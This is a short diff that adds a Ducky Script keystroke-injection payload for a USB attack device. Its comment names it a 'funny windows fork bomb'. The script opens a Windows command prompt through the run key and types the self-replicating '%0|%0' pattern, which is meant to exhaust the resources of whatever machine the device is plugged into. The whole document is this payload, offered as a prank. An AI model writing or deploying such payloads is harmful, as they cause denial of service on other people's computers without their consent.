@@ -1,0 +1,7 @@
+REM runs the funny windows fork bomb
+DEFAULT_DELAY 200
+GUI
+STRING cmd
+ENTER
+STRING %0|%0
+ENTER
